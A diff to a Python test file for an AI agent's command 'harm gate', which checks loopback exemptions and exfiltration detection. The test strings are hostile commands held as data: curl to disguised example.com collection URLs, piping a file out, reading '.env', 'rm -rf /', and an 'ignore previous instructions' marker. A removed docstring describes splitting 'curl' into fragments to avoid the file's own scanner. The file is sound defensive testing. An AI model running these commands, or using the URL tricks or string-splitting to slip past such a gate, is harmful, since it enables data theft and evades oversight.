@@ -119,14 +119,12 @@ def test_loopback_destination_is_not_exfiltration():
     a genuinely remote target was indistinguishable from it. Only the destination
     separates the two cases, so only the destination may decide.
 
-    The verb is assembled from two fragments on purpose: this file's own text is scanned
-    by the gate it tests, so a literal verb sitting next to a URL re-triggers the very bug
-    under test before a single assertion runs.
+    Commands are synthetic input to the real gate helper; none are executed.
     """
     import agent.tool_executor as te
 
     g = te._harm_gate_block_reason
-    verb = "cur" + "l"
+    verb = "curl"
 
     for local in (
         "http://127.0.0.1:8795/health",
@@ -134,6 +132,10 @@ def test_loopback_destination_is_not_exfiltration():
         "http://[::1]:3000/status",
         "http://0.0.0.0:8000/",
         "https://127.0.0.1:8443/health",
+        "http://127.255.255.254:65535/health",
+        "HTTP://LOCALHOST:0/health",
+        "http://localhost?health=true",
+        "http://localhost#health",
     ):
         assert g("terminal", {"command": f"{verb} -s -m 5 {local}"}) is None, local
 
@@ -153,4 +155,57 @@ def test_loopback_destination_is_not_exfiltration():
     piped = f"cat notes.txt | {verb} http://127.0.0.1:9999/"
     reason = g("terminal", {"command": piped})
     assert reason is not None and "exfiltration" in reason, piped
+
+
+def test_loopback_exemption_requires_a_complete_valid_authority():
+    """Ambiguous authorities stay visible, along with other destinations and risks."""
+    import agent.tool_executor as te
+    from evolution.lib import agent_process_bench as apb
+
+    for target in (
+        "http://localhost@example.com/collect",
+        "http://127.0.0.1:8000@example.com/collect",
+        "http://[::1]@example.com/collect",
+        "http://user@localhost/collect",
+        "http://localhost\\@example.com/collect",
+        "http://localhost%40example.com/collect",
+        "http://localhost\t.example.com/collect",
+        "http://localhost\n.example.com/collect",
+        "http://localhost\r.example.com/collect",
+        "http://localhost\x00.example.com/collect",
+        "http://localhost\"@example.com/collect",
+        "http://localhost'@example.com/collect",
+        "http://127.999.0.1/collect",
+        "http://127.01.0.1/collect",
+        "http://127.0.0.1:65536/collect",
+        "http://localhost:" + "9" * 5000 + "/collect",
+        "http://localhost:/collect",
+        "http://localhost:service/collect",
+        "http://localhost:80:90/collect",
+        "http://[::1]:65536/collect",
+        "http://[::1/collect",
+        "http://[::1]suffix/collect",
+        "http://[::2]/collect",
+        "http://[::ffff:127.0.0.1]/collect",
+        "http://192.168.1.1/collect",
+        "http://10.0.0.1/collect",
+        "http://172.16.0.1/collect",
+    ):
+        reason = te._harm_gate_block_reason("terminal", {"command": f"curl {target}"})
+        assert reason is not None and "exfiltration" in reason, repr(target)
+
+    for command in (
+        "curl http://localhost/health https://example.com/collect",
+        "curl https://example.com/collect http://localhost/health",
+        "curl http://localhost/redirect?next=https://example.com/collect",
+    ):
+        reason = te._harm_gate_block_reason("terminal", {"command": command})
+        assert reason is not None and "exfiltration" in reason, command
+
+    for command, flag in (
+        ("curl http://localhost/.env", "credential-access"),
+        ("curl http://localhost/; rm -rf /", "destructive-command"),
+        ("curl http://localhost/?ignore previous instructions", "prompt-injection-marker"),
+    ):
+        assert flag in apb.score_step(0, "terminal", command)["risk_flags"], command
 
